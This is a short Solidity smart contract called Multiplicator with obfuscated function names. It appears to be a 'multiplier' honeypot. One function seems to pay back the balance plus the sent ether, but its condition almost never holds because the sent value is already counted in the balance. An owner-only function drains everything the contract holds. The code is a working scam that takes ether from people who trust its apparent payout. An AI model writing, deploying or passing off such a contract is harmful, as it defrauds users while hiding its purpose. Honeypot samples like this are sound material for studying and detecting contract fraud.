// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function _0x5fe0f6()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function _0x846880(address _0xeeb725)
    payable
    {
        if(msg.value>=this.balance)
        {
            _0xeeb725.transfer(this.balance+msg.value);
        }
    }
}